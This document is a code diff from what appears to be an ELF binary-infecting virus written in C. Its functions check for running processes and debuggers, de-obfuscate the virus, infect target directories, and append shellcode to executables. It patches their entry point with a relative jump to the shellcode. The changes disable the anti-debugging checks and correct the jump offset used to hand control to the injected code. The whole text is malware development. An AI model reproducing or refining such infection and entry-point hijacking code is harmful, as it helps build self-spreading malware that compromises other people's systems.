@@ -8,10 +8,10 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  if (checkProcess(procName) != 0)
-    return (stop(1, magic));
-  if (preventDebug() == -1)
-    return (stop(1, magic));
+  /* if (checkProcess(procName) != 0) */
+  /*   return (stop(1, magic)); */
+  /* if (preventDebug() == -1) */
+  /*   return (stop(1, magic)); */
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
@@ -29,8 +29,6 @@ static int   stop(int status, void *magic) {
     return (status);
   asm("leave\n\t"
       "leave");
-  // TODO Find why there is still 16 bytes on stack
-  rsp += 16;
   asm("mov $0, %rbx\n\t"
       "mov $0, %rcx\n\t"
       "mov $0, %rdx\n\t"
@@ -603,7 +601,7 @@ static int  appendShellcode(struct bfile *bin) {
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   copyModifiedCode(&new, bin->size, size);
-  address = -(0xc000000 + bin->size + size) + bin->header->e_entry - 6;
+  address = -(0xc000000 + bin->size + size) + bin->header->e_entry - 5;
   ins[0] = 0xe9;
   ins[1] = (address >> 0) & 0xff;
   ins[2] = (address >> 8) & 0xff;
